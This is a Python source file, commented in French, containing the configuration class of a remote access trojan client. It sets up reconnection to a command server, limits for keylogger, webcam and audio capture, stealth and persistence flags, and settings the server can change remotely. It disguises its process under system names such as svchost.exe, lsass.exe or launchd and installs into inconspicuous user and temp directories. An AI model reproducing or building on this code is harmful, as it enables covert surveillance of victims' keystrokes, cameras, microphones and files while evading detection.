"""
Client Configuration - Configuration du client RAT
Paramètres de connexion, sécurité et fonctionnalités
"""

import os
import json
import platform
from typing import Dict, Any, Optional
from pathlib import Path

class ClientConfig:
    """Configuration du client RAT avec paramètres par défaut sécurisés"""
    
    def __init__(self, config_file: str = None):
        # === CONNEXION SERVEUR ===
        self.SERVER_HOST = "127.0.0.1"
        self.SERVER_PORT = 8888
        self.CONNECTION_TIMEOUT = 10  # Secondes
        self.SOCKET_TIMEOUT = 30
        self.RECONNECT_DELAY = 5
        self.MAX_RECONNECT_ATTEMPTS = -1  # -1 = infini
        
        # === SÉCURITÉ ===
        self.USE_SSL = False
        self.SSL_VERIFY_CERT = False  # Pour environnement de test
        self.SSL_CERT_FILE = None
        self.ENCRYPTION_KEY = None
        
        # === COMMUNICATION ===
        self.HEARTBEAT_INTERVAL = 30  # Secondes
        self.MAX_MESSAGE_SIZE = 50 * 1024 * 1024  # 50MB
        self.BUFFER_SIZE = 4096
        self.COMPRESSION_ENABLED = True
        
        # === FONCTIONNALITÉS ===
        self.STEALTH_MODE = False
        self.PERSISTENT = False
        self.AUTO_START_KEYLOGGER = False
        self.DEBUG = False
        
        # === LIMITATIONS DE SÉCURITÉ ===
        self.MAX_SCREENSHOT_SIZE = 1920 * 1080
        self.MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
        self.MAX_KEYLOG_DURATION = 600  # 10 minutes
        self.MAX_WEBCAM_DURATION = 300  # 5 minutes
        self.MAX_AUDIO_DURATION = 120  # 2 minutes
        
        # === CHEMINS ET FICHIERS ===
        self.CLIENT_NAME = self._generate_client_name()
        self.INSTALL_PATH = self._get_install_path()
        self.LOG_FILE = None  # Pas de logs par défaut en mode furtif
        self.TEMP_DIR = self._get_temp_dir()
        
        # === IDENTIFICATION ===
        self.CLIENT_ID = self._generate_client_id()
        self.CLIENT_VERSION = "1.0.0"
        self.BUILD_DATE = "2025-01-01"
        
        # Chargement de la configuration personnalisée
        if config_file:
            self.load_from_file(config_file)
    
    def _generate_client_name(self) -> str:
        """Génère un nom de client discret"""
        system = platform.system().lower()
        
        if system == 'windows':
            names = [
                'svchost.exe', 'dwm.exe', 'explorer.exe', 
                'winlogon.exe', 'csrss.exe', 'lsass.exe'
            ]
        elif system == 'linux':
            names = [
                'systemd', 'kthreadd', 'dbus-daemon', 
                'NetworkManager', 'systemd-logind'
            ]
        elif system == 'darwin':
            names = [
                'launchd', 'kernel_task', 'WindowServer',
                'Dock', 'Finder', 'loginwindow'
            ]
        else:
            names = ['system_service', 'background_task']
        
        import random
        return random.choice(names)
    
    def _get_install_path(self) -> str:
        """Détermine le chemin d'installation selon l'OS"""
        system = platform.system().lower()
        
        if system == 'windows':
            paths = [
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft'),
                os.path.join(os.environ.get('TEMP', ''), 'Microsoft')
            ]
        elif system == 'linux':
            home = os.path.expanduser('~')
            paths = [
                os.path.join(home, '.local', 'share'),
                os.path.join(home, '.config'),
                '/tmp/.system'
            ]
        elif system == 'darwin':
            home = os.path.expanduser('~')
            paths = [
                os.path.join(home, 'Library', 'Application Support'),
                os.path.join(home, 'Library', 'Caches'),
                '/tmp/.system'
            ]
        else:
            paths = ['/tmp', os.path.expanduser('~')]
        
        # Sélection du premier chemin accessible
        for path in paths:
            try:
                os.makedirs(path, exist_ok=True)
                if os.access(path, os.W_OK):
                    return path
            except:
                continue
        
        return os.getcwd()
    
    def _get_temp_dir(self) -> str:
        """Détermine le répertoire temporaire"""
        import tempfile
        
        try:
            return tempfile.gettempdir()
        except:
            return os.getcwd()
    
    def _generate_client_id(self) -> str:
        """Génère un ID unique pour le client"""
        import uuid
        import hashlib
        
        # Basé sur des caractéristiques système pour la persistance
        system_info = f"{platform.node()}-{platform.machine()}-{platform.system()}"
        
        # Hash pour anonymiser
        hasher = hashlib.sha256()
        hasher.update(system_info.encode())
        
        return hasher.hexdigest()[:16]
    
    def load_from_file(self, config_file: str) -> bool:
        """
        Charge la configuration depuis un fichier JSON
        
        Args:
            config_file: Chemin vers le fichier de configuration
        
        Returns:
            bool: True si succès, False sinon
        """
        try:
            if not os.path.exists(config_file):
                return False
            
            with open(config_file, 'r', encoding='utf-8') as f:
                config_data = json.load(f)
            
            # Mise à jour des attributs
            for key, value in config_data.items():
                if hasattr(self, key.upper()):
                    setattr(self, key.upper(), value)
            
            return True
            
        except Exception as e:
            if self.DEBUG:
                print(f"Erreur chargement config: {e}")
            return False
    
    def save_to_file(self, config_file: str) -> bool:
        """
        Sauvegarde la configuration dans un fichier JSON
        
        Args:
            config_file: Chemin vers le fichier de configuration
        
        Returns:
            bool: True si succès, False sinon
        """
        try:
            # Récupération des attributs de configuration
            config_data = {}
            for attr_name in dir(self):
                if (attr_name.isupper() and 
                    not attr_name.startswith('_') and 
                    not callable(getattr(self, attr_name))):
                    config_data[attr_name.lower()] = getattr(self, attr_name)
            
            # Sauvegarde
            os.makedirs(os.path.dirname(config_file), exist_ok=True)
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config_data, f, indent=2, ensure_ascii=False)
            
            return True
            
        except Exception as e:
            if self.DEBUG:
                print(f"Erreur sauvegarde config: {e}")
            return False
    
    def update_from_server(self, server_config: Dict[str, Any]) -> bool:
        """
        Met à jour la configuration avec les paramètres du serveur
        
        Args:
            server_config: Configuration reçue du serveur
        
        Returns:
            bool: True si mise à jour effectuée
        """
        try:
            updated = False
            
            # Liste des paramètres modifiables à distance
            remote_configurable = [
                'HEARTBEAT_INTERVAL', 'MAX_MESSAGE_SIZE', 'COMPRESSION_ENABLED',
                'MAX_SCREENSHOT_SIZE', 'MAX_FILE_SIZE', 'MAX_KEYLOG_DURATION',
                'MAX_WEBCAM_DURATION', 'MAX_AUDIO_DURATION', 'DEBUG'
            ]
            
            for key, value in server_config.items():
                key_upper = key.upper()
                if (key_upper in remote_configurable and 
                    hasattr(self, key_upper) and 
                    getattr(self, key_upper) != value):
                    
                    setattr(self, key_upper, value)
                    updated = True
                    
                    if self.DEBUG:
                        print(f"Config mise à jour: {key_upper} = {value}")
            
            return updated
            
        except Exception as e:
            if self.DEBUG:
                print(f"Erreur mise à jour config: {e}")
            return False
    
    def get_system_info(self) -> Dict[str, Any]:
        """Retourne les informations système pour la configuration"""
        try:
            import psutil
            
            return {
                'client_id': self.CLIENT_ID,
                'hostname': platform.node(),
                'platform': platform.platform(),
                'system': platform.system(),
                'architecture': platform.architecture()[0],
                'cpu_count': os.cpu_count(),
                'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
                'install_path': self.INSTALL_PATH,
                'client_version': self.CLIENT_VERSION,
                'python_version': platform.python_version(),
                'stealth_mode': self.STEALTH_MODE,
                'persistent': self.PERSISTENT
            }
        except:
            return {
                'client_id': self.CLIENT_ID,
                'hostname': platform.node(),
                'platform': platform.platform(),
                'system': platform.system(),
                'client_version': self.CLIENT_VERSION
            }
    
    def validate_config(self) -> tuple[bool, list]:
        """
        Valide la configuration actuelle
        
        Returns:
            tuple: (is_valid, list_of_errors)
        """
        errors = []
        
        # Validation serveur
        if not self.SERVER_HOST:
            errors.append("SERVER_HOST manquant")
        
        if not isinstance(self.SERVER_PORT, int) or not (1 <= self.SERVER_PORT <= 65535):
            errors.append("SERVER_PORT invalide")
        
        # Validation timeouts
        if self.CONNECTION_TIMEOUT <= 0:
            errors.append("CONNECTION_TIMEOUT doit être positif")
        
        if self.SOCKET_TIMEOUT <= 0:
            errors.append("SOCKET_TIMEOUT doit être positif")
        
        # Validation limites de sécurité
        if self.MAX_MESSAGE_SIZE > 100 * 1024 * 1024:  # 100MB max
            errors.append("MAX_MESSAGE_SIZE trop élevé")
        
        if self.MAX_KEYLOG_DURATION > 3600:  # 1h max
            errors.append("MAX_KEYLOG_DURATION trop élevé")
        
        # Validation chemins
        if not os.path.exists(self.INSTALL_PATH):
            try:
                os.makedirs(self.INSTALL_PATH, exist_ok=True)
            except:
                errors.append("INSTALL_PATH inaccessible")
        
        return len(errors) == 0, errors
    
    def get_config_summary(self) -> str:
        """Retourne un résumé de la configuration"""
        is_valid, errors = self.validate_config()
        
        summary = f"""
=== CONFIGURATION CLIENT RAT ===
Serveur: {self.SERVER_HOST}:{self.SERVER_PORT}
SSL: {'Activé' if self.USE_SSL else 'Désactivé'}
Mode furtif: {'Activé' if self.STEALTH_MODE else 'Désactivé'}
Persistant: {'Activé' if self.PERSISTENT else 'Désactivé'}
Debug: {'Activé' if self.DEBUG else 'Désactivé'}

Client ID: {self.CLIENT_ID}
Nom processus: {self.CLIENT_NAME}
Chemin install: {self.INSTALL_PATH}

Limites de sécurité:
- Keylogger: {self.MAX_KEYLOG_DURATION}s max
- Webcam: {self.MAX_WEBCAM_DURATION}s max
- Audio: {self.MAX_AUDIO_DURATION}s max
- Fichiers: {self.MAX_FILE_SIZE // (1024*1024)}MB max

Configuration {'VALIDE' if is_valid else 'INVALIDE'}
        """
        
        if errors:
            summary += f"\nERREURS: {', '.join(errors)}"
        
        return summary.strip()
    
    def create_default_config_file(self, file_path: str) -> bool:
        """Crée un fichier de configuration par défaut"""
        default_config = {
            "server_host": "127.0.0.1",
            "server_port": 8888,
            "use_ssl": False,
            "debug": False,
            "stealth_mode": False,
            "persistent": False,
            "heartbeat_interval": 30,
            "max_keylog_duration": 600,
            "max_webcam_duration": 300,
            "max_audio_duration": 120
        }
        
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=2, ensure_ascii=False)
            return True
        except:
            return False